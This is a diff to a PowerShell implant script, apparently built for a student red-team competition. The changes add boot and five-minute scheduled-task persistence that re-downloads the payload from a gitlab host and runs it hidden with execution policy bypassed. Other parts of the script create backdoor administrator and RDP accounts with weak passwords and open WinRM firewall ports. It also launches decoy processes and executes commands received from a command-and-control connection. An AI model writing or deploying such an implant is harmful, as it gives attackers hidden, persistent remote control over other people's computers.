@@ -3,17 +3,29 @@ param(
     [string]$beaconIPAddress
 )
 
+# Create scheduled task for this payload to run on boot
 New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "ConnectionToC2"
 
-Make-Directory "C:\Program Files (x86)\Webkinz"
-New-Item -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
-$backupCommands = "if(!(Test-Path C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1)){"
-$backupCommands += "wget -o C:\ProgramData\EpicGames\Fortnite\windowsTryouts.ps1 'gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1'"
-$backupCommands += "& C:\ProgramData\EpicGames\Fortnite\windowsTryouts.ps1 -beaconIPAddress $($beaconIPAddress)}"
-$backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
+# Create the backup script
+# The backup script will check to see if the main payload exists.
+# If it doesn't this script will redownload the main payload, and start a new process for it
+if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
+    Make-Directory "C:\Program Files (x86)\Webkinz"
+}
+if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
+    New-Item -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
+    $backupCommands = "if(!(Test-Path C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1)){"
+    $backupCommands += "wget -o C:\ProgramData\EpicGames\Fortnite\windowsTryouts.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1`""
+    $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1 -BeaconIPAddress $($beaconIPAddress)`" -Verb RunAs}"
+    $backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
+}
 
+# Create Scheduled task for the backup script to check for the main payload every 5 minutes
+New-ScheduledTaskAction -Execute "C:\Program Files (x86)\Webkinz\backup.ps1"
+$trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 5)
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BackupImportantFiles"
 
 # Set up Firewall rules to make sure the C2 can communicate with the client
 netsh adv f a r n="WinRM Default Rule" dir=in act=allow prof=any prot=tcp localport=5985,5986
@@ -30,6 +42,7 @@ $reader = New-Object System.IO.StreamReader($tcpStream)
 $writer = New-Object System.IO.StreamWriter($tcpStream)
 $writer.AutoFlush = $true
 
+# Add some extra users
 New-LocalUser -Name "Jimithy" -Password (ConvertTo-SecureString -String "Password-123456")
 Add-LocalGroupMember -Member "Jimithy" -Group "Administrators"
 Add-LocalGroupMember -Member "Jimithy" -Group "Remote Desktop Users"
@@ -41,6 +54,7 @@ Add-LocalGroupMember -Member "Doug" -Group "Remote Desktop Users"
 $I = 0
 
 while($true){
+    # every so often check to see if our users are still there
     if($I -ge 4){
         $I = 0
         $Users = Get-LocalUser
@@ -56,7 +70,11 @@ while($true){
         }
     }
 
+    # start a new dummy powershell process that does nothing
+    $sleepTime = Get-Random -Minimum 5 -Maximum 60
+    Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "-Command Start-Sleep -Seconds $($sleepTime)"
 
+    # Get commands from the C2, run them and send the output back
     $command = $reader.Read()
     $reply = & $command
     $writer.write($reply)
